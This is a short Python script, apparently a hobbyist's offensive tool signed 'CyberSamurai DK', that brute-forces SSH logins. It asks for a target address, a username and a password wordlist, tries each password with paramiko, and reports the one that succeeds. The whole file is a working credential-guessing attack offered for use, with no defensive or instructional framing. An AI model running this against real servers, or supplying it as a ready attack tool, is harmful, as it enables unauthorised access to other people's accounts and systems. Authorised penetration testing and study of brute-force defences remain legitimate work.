#!/usr/bin/env python3

# This Script BruteForces towards SSH
# You need a .txt file in combo with this script
# CyberSamurai DK

import paramiko, sys, os, socket, termcolor


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(lhost, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code


lhost = input('[!] (ง •̀_•́)ง Target SSH Address: ')
username = input('[!] (ಠ_ಠ) Input SSH Username: ')
input_file = input('[!] (⌐■_■) Path to Pass.txt: ')

if os.path.exists(input_file) == False:
    print('[-] That File/Path Does Not Exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try :
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] (^‿^) Found Password:' + password + ', For User: ' + username), 'green'))
                break
            elif response == 1:
                print('[-] Incorrect Login: ' + password)
            elif response == 2:
                print('[-] (◡︵◡) Cannot Connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
